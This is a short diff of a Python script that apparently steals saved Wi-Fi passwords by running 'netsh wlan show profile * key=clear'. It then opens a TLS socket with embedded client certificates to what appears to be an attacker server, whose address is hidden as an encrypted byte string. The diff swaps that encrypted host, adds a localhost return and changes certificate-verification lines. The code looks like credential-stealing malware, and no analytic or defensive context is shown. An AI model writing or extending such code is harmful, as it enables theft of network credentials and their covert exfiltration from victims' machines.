@@ -14,9 +14,9 @@ points = subprocess.Popen(["NETSH", "WLAN", "SHOW", "PROFILE", "*", "KEY=CLEAR"]
 
 
 def know_gme():
-    unkown = b'\x9eLO\x92\xc2]%\x8e\xa9\x96,\xc1\xbbd\x0f\xba\xb3\x9c\x1f\x9b\x97\xad`\x9dB\xb3\xea`\xd7\t\x19\x05\x02Y\xeb\xcf\xea\x05\xdeI\x8a\xc5\xe2\x80\xdeUW7\x8b\x85~V\xdd3k\xb7\xb3\xcb\x05\x82\x89\x05A_'
+    unkown = b'u\x1b1.\x9aQ\x11CO>\x87:e7\xd6q\x14\x02[#\x8d{p\xad\x99\xecj\t\xea\xc7\xd3\xc6\xe1\x15n\xce|a=BowY$\xc4,\x846\x7fG\x82\xca\xbb\x1e\xbb\x93<\x1e\xb6\x03S\x1a\\\xff'
     return str(decrypt(unkown).decode())
-    #return "127.0.0.1""
+    return "127.0.0.1"
 
 
 def get_points():
@@ -51,7 +51,6 @@ def main(sec):
     # Los juntamos para su uso
     get.join()
 
-    sec.close()
 
 def all_right():
     import certs
@@ -72,7 +71,7 @@ def all_right():
     csd.close()
 
     context = ssl.SSLContext(ssl.PROTOCOL_TLS)
-    context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
+    #context.verify_mode = ssl.CERT_NONE  # Cambiar a ssl.CERT_REQUIRED si deseas verificar el certificado del servidor
     context.load_cert_chain(certfile=cock.name, keyfile=csd.name)
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
